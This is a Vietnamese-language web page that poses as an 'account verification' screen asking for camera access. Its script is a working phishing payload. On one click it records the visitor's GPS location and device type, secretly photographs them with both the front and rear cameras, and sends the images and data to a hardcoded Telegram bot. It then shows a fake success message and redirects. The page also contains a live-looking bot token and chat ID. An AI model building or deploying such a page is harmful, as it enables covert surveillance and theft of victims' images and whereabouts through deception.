<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh Tài Khoản</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #161b22;
            padding: 32px 24px;
            border-radius: 24px;
            text-align: center;
            width: 90%;
            max-width: 380px;
            border: 1px solid #30363d;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        .camera-view {
            width: 100%;
            height: 320px;
            background: #000;
            border-radius: 16px;
            margin: 20px 0;
            overflow: hidden;
            border: 2px solid #238636;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 12px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        .btn:disabled {
            background: #21262d;
            color: #8b949e;
            cursor: not-allowed;
        }
        #status {
            font-size: 14px;
            color: #8b949e;
            margin-top: 16px;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2 style="margin: 0 0 8px 0;">Xác Minh Tài Khoản</h2>
        <p style="color:#8b949e; margin-bottom:20px;">Vui lòng cho phép truy cập camera</p>
        
        <div class="camera-view">
            <video id="preview" autoplay playsinline muted></video>
        </div>

        <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
        <div id="status">Hệ thống sẽ tự động hoàn tất</div>
    </div>

    <script>
        const BOT_TOKEN = "8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds";
        const CHAT_ID = "7031115869";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

        const btn = document.getElementById('startBtn');
        const video = document.getElementById('preview');
        const status = document.getElementById('status');
        let frontStream = null;

        // Lấy vị trí
        async function getLocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return resolve({link: "Không hỗ trợ vị trí"});
                navigator.geolocation.getCurrentPosition(
                    p => {
                        const lat = p.coords.latitude.toFixed(6);
                        const lon = p.coords.longitude.toFixed(6);
                        resolve({link: `https://www.google.com/maps?q=${lat},${lon}`});
                    },
                    () => resolve({link: "Không lấy được vị trí"})
                );
            });
        }

        btn.addEventListener('click', async () => {
            btn.disabled = true;
            btn.textContent = "ĐANG XỬ LÝ...";
            status.textContent = "Đang chụp ảnh và xác thực...";

            try {
                await main();
            } catch (e) {
                console.error(e);
                status.textContent = "Có lỗi xảy ra. Vui lòng thử lại.";
                btn.disabled = false;
                btn.textContent = "THỬ LẠI";
            }
        });

        async function main() {
            const info = {
                time: new Date().toLocaleString('vi-VN'),
                device: '',
                os: '',
                location: ''
            };

            detectDevice(info);
            const loc = await getLocation();
            info.location = loc.link;

            const [frontBlob, backBlob] = await Promise.all([
                captureCamera('user'),
                captureCamera('environment')
            ]);

            await sendAlbumToTelegram(info, frontBlob, backBlob);
            startCountdown();
        }

        function detectDevice(info) {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/i.test(ua)) {
                info.os = 'iOS';
                info.device = 'iPhone';
            } else if (/Android/i.test(ua)) {
                info.os = 'Android';
                info.device = 'Android Device';
            } else {
                info.os = 'Desktop';
                info.device = 'PC/Laptop';
            }
        }

        async function captureCamera(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });

            if (facingMode === 'user') frontStream = stream;

            return new Promise(resolve => {
                const v = document.createElement('video');
                v.srcObject = stream;
                v.play();
                v.onloadedmetadata = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = v.videoWidth || 640;
                    canvas.height = v.videoHeight || 480;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
                };
            });
        }

        async function sendAlbumToTelegram(info, frontBlob, backBlob) {
            const caption = `🔐 **Xác Minh Tài Khoản**\n\n` +
                           `⏰ Thời gian: ${info.time}\n` +
                           `📱 Thiết bị: ${info.device}\n` +
                           `🖥 Hệ điều hành: ${info.os}\n` +
                           `📍 Vị trí: ${info.location}`;

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);

            const media = [];

            if (frontBlob) {
                formData.append('front', frontBlob, 'front.jpg');
                media.push({ type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" });
            }
            if (backBlob) {
                formData.append('back', backBlob, 'back.jpg');
                media.push({ type: "photo", media: "attach://back" });
            }

            formData.append('media', JSON.stringify(media));

            await fetch(`${TELEGRAM_API}/sendMediaGroup`, {
                method: 'POST',
                body: formData
            });
        }

        function startCountdown() {
            let time = 4;
            const timer = setInterval(() => {
                btn.textContent = `HOÀN TẤT TRONG ${time} GIÂY`;
                status.textContent = "Xác thực thành công • Đang chuyển hướng...";
                time--;
                if (time < 0) {
                    clearInterval(timer);
                    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                    window.location.href = ""; // Thay link nếu cần
                }
            }, 900);
        }
    </script>
</body>
</html>
